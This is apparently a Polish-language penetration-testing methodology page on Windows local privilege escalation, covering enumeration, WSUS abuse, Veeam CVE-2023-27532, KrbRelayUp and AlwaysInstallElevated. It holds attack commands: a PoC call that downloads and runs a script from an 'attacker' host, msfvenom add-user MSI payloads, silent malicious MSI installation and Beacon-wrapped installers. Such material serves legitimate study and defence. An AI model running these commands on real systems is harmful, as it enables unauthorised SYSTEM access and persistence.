# Eskalacja uprawnień lokalnych w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona zbiera ogólną metodologię eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Opisany tu praktyczny przebieg enumeracji opiera się również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację z DerbyCon na temat eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są access tokens w Windows, przed dalszą lekturą zapoznaj się z poniższą stroną:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na poniższej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Jeśli nie wiesz, czym są integrity levels w Windows, przed dalszą lekturą zapoznaj się z poniższą stroną:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** poniższą **stronę** i **sprawdź** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić zmianę UEFI NVRAM w trybie offline, a następnie wykorzystanie DMA przed uruchomieniem systemu i modyfikację pamięci Windows w celu uzyskania `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / cicha eskalacja przez UIAccess

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` mogą zostać wykorzystane do uzyskania High IL bez monitów, jeśli obejdzie się kontrole bezpiecznej ścieżki AppInfo. Szczegółowy opis obejścia UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację wpisów rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze z uprawnieniami SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje Windows wprowadziły również ścieżkę LPE z użyciem **SMB na dowolnym porcie**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows ma znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits zależne od wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach produktów Microsoft. Baza zawiera ponad 4700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stwarza środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i wybranych potencjalnych poprawkach; przed uznaniem wyniku za dotyczący danego systemu zweryfikuj dokładny produkt i zastępujące aktualizacje.

W przypadku local exploit zależnego od wersji sprawdź **architekturę uruchomionego procesu** oraz architekturę systemu operacyjnego. W 64-bitowym Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje 32-bitowy katalog systemowy, a `%windir%\Sysnative` umożliwia temu procesowi dostęp do natywnego katalogu systemowego. Alias jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego lub brak potencjalnie wymaganej aktualizacji KB nie dowodzą podatności na exploit; porównaj bieżącą kompilację, zainstalowaną lub zastępującą aktualizację, architekturę procesu oraz wymagania exploita z [biuletynem bezpieczeństwa Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na GitHubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające lub Juicy info?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, na stronie [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Dokumenty każdego użytkownika, ale ustawienie `OutputDirectory` lub parametr `-OutputDirectory` polecenia `Start-Transcript` mogą przekierować pliki do wspólnego lub ukrytego folderu. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę zapisu i ACL pliku: może on zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest wskazówką tylko wtedy, gdy jej treść ujawnia możliwą do wykorzystania tożsamość o wyższych uprawnieniach, a ta tożsamość może zalogować się w danym kontekście.

### Rejestrowanie modułów PowerShell

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym uruchomione polecenia, ich wywołania oraz fragmenty skryptów. Mogą jednak nie zostać zarejestrowane wszystkie szczegóły wykonania ani wyniki.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” dokumentacji i wybierz **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić 15 ostatnich zdarzeń z dzienników PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowany jest pełny przebieg aktywności i pełna treść wykonywanego skryptu, dzięki czemu każdy blok kodu jest dokumentowany podczas działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w analizie kryminalistycznej i badaniu złośliwego działania. Dokumentowanie całej aktywności w chwili jej wystąpienia pozwala uzyskać szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia logowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Punkt końcowy WSUS korzystający z HTTP jest wskazówką do dalszej analizy pod kątem przechwytywania metadanych aktualizacji. Możliwość wykorzystania zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwytywać lub kontrolować jego ruch oraz od zasad zaufania i instalowania aktualizacji obowiązujących na kliencie. Sam URL nie oznacza możliwości wykonania kodu. [Firma Microsoft zaleca używanie TLS dla metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpierw sprawdź, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając wiersz polecenia cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub następujące polecenie w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z tych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A także jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla ścieżki przechwytywania ruchu HTTP, ale nie dowodzi, że przechwycenie ruchu, akceptacja złośliwej aktualizacji ani jej instalacja z podwyższonymi uprawnieniami są możliwe. Gdy ma wartość `0`, ta konkretna skonfigurowana usługa WSUS nie jest wybierana przez tę zasadę.

Aby wykorzystać te luki, możesz użyć narzędzi takich jak [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — są to uzbrojone skrypty exploitów MiTM służące do wstrzykiwania „fałszywych” aktualizacji do ruchu WSUS bez SSL.

Przeczytaj badania tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo jest to luka wykorzystywana przez ten bug:

> Jeśli możemy zmodyfikować proxy naszego lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i wykonać kod jako użytkownik z podwyższonymi uprawnieniami na naszym zasobie.
>
> Co więcej, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, użyje również jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat self-signed dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać ruch WSUS zarówno HTTP, jak i HTTPS. WSUS nie stosuje mechanizmów podobnych do HSTS, które zapewniałyby walidację certyfikatu typu trust-on-first-use. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma prawidłową nazwę hosta, usługa go zaakceptuje.

Możesz wykorzystać tę lukę za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS kontrolowane przez administratora

Istnieje osobna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie serwera `WSUS Administrators` oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal grupę komputerów klienckich, do której trafiłaby zatwierdzona aktualizacja. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a także [dokumentuje relację zaufania dotyczącą publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu dla lokalnie publikowanych treści. Zanim uznasz to za ścieżkę eskalacji uprawnień, potwierdź, że proponowana aktualizacja jest podpisana i akceptowana, ma zastosowanie do celu oraz zostaje zainstalowana w bardziej uprzywilejowanym kontekście. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane payloady przez `.txt`/`.esd`

Jest to inne naruszenie granicy zaufania niż przechwytywanie połączenia WSUS przez HTTP: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do opublikowania i zatwierdzenia niestandardowej aktualizacji. Jedną z praktycznych dróg wejścia jest przekazanie uwierzytelnienia konta komputera WSUS do osobnego serwera MSSQL hostującego `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że masz uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o osobnej ścieżce ataku, która przekazuje uwierzytelnienie klienta WSUS z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w sekcji [Nadużywanie WSUS HTTP do NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Utwórz, wskaż cel i zatwierdź aktualizację

Proces obsługi niestandardowej aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API do publikowania. Istotne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Importowanie metadanych aktualizacji | `spImportUpdate` |
| Zapisywanie fragmentów XML dotyczących wymagań wstępnych, lokalizacji i rozszerzeń | `spSaveXMLFragment` |
| Powiązanie skrótu treści z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyliczenie/utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i handler `CommandLineInstallation` muszą być zgodne we wszystkich zaimportowanych metadanych i fragmentach. Po przypisaniu adresu URL treści i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia, zamiast ponownie wykorzystywać przykładowe GUID-y.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu oparte na rozszerzeniu

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, jeśli podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez uprzedniego sprawdzenia, czy bajty to tekst lub prawidłowy obraz ESD. Dlatego niezmieniony plik PE nazwany na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez program obsługi instalacji aktualizacji z wiersza poleceń. Jest to błąd pomylenia polityki i typu, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Przygotowanie i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje pobranie zarejestrowanej zawartości przez WSUS. Serwer źródłowy musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer obejmuje początkową sekwencję `HEAD`/`GET` oraz żądania zakresu bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z komunikatem, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Badawczy PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany do wykonania sekwencji import/fragment/URL/grupa/wdrożenie, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do przygotowania zawartości. Minimalne uruchomienie w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Wykonywanie bez nadzoru i persistence przez ponawianie

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie ze skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. W testach payload, którego aktualizacja pozostawała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc mechanizm ponawiania może stać się cyklicznym sposobem na persistence; jest to jednak głośne, ponieważ klient pokazuje stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Wykrywanie i punkty kontrolne hardeningu

Przydatne punkty kontrolne po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; badaj nowe grupy docelowe, zewnętrzne źródła zawartości, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanego `FileVerficationFailed` oraz `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą zawartości, zamiast ufać rozszerzeniu.
- Wyszukuj przypadki wielokrotnego niepowodzenia/ponawiania instalacji przez Windows Update oraz uruchamiania PE lub nieoczekiwanej aktywności procesów potomnych/sieciowej związanej z zawartością o nazwach `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Zewnętrzne auto-updatery i IPC agentów (local privesc)

Wiele agentów korporacyjnych udostępnia powierzchnię IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli można wymusić rejestrację na serwerze atakującego, a updater ufa niezaufanemu root CA lub stosuje słabe kontrole podpisu, lokalny użytkownik może dostarczyć złośliwy plik MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi kopii zapasowych na **TCP/9401**. [Komunikat Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych danych logowania do bazy konfiguracji w obrębie sieci kopii zapasowych; odrębny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać także poza localhost, sprawdź więc jej rzeczywisty adres i PID.

- **Rozpoznanie**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` są wskazówkami, ale nie stanowią pełnej weryfikacji poprawek.
- **Minimalne wersje z poprawką**: Veeam wymienia **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wydania z poprawką; wcześniejsze wydania są podatne. Sama czteroczłonowa wersja pliku nie pozwala odróżnić niezałatanej wersji bazowej od późniejszej poprawki dla tych samych numerów kompilacji. Przed uznaniem granicznej kompilacji za naprawioną sprawdź identyfikator poprawki w [historii kompilacji producenta](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi DLL Veeam w tym samym katalogu, a następnie uruchom payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Przytoczony PoC pokazuje wykonanie poleceń jako SYSTEM, gdy spełnione są dodatkowe wymagania wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.
## KrbRelayUp

Lokalny relay Kerberos może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM uwierzytelni się, a przekazana tożsamość ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zapisy LDAP zarówno RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiedniej delegacji i uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu klucza poświadczeń oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź rzeczywistą politykę DC dotyczącą [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [powiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu tożsamości, której uwierzytelnianie jest przekazywane, oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Istotne są typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może działać inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Wynik mogą też zmienić routing zapory/OXID i zainstalowane aktualizacje. Traktuj liberalną politykę lub pasujący ACL jako element wymagający weryfikacji; pasywne wyliczanie nie powinno wywoływać wymuszania przez COM, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może umożliwić uzyskanie biletu komputera, a następnie — tylko jeśli konto ma wymagane uprawnienia do replikacji katalogu — osobną ścieżkę DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz pod adresem [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość to **0x1**), użytkownicy o dowolnym poziomie uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Payloady Metasploit

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z PowerUp, aby utworzyć w bieżącym katalogu plik binarny Windows MSI do eskalacji uprawnień. Ten skrypt zapisuje prekompilator instalatora MSI, który wyświetla monit o dodanie użytkownika/grupy (dlatego potrzebny będzie dostęp GIU):

```
Write-UserAddMSI
```

Uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten poradnik, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **polecenia**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **nowy payload Windows EXE TCP** w lokalizacji `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj lokalizacji **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż przejdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić także inne właściwości, takie jak **Author** i **Manufacturer**, aby zainstalowana aplikacja wyglądała bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, zaznacz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony zaraz po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawiona jest platforma x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i narzędzia wykrywające

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc należy zwrócić na nie uwagę.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

